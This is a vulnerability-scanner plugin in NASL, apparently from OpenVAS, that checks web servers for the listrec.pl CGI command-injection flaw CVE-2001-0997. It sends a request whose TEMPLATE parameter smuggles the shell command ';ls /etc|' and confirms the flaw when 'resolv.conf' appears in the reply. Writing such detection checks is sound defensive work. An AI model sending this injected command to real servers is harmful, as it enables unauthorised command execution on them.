if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10769" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2001-0997" );
	script_name( "Checks for listrec.pl" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2001 Matt Moore" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Remove it from /cgi-bin/common/." );
	script_tag( name: "summary", value: "The 'listrec.pl' cgi is installed. This CGI has
  a security flaw that lets an attacker execute arbitrary commands on the remote server,
  usually with the privileges of the web server." );
	script_tag( name: "solution_type", value: "Mitigation" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
for dir in nasl_make_list_unique( "/", "/cgi-bin/common", "/cgi-local", "/cgi_bin", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = NASLString( dir, "/listrec.pl?APP=qmh-news&TEMPLATE=;ls%20/etc|" );
	if(http_vuln_check( port: port, url: url, pattern: "resolv\\.conf" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

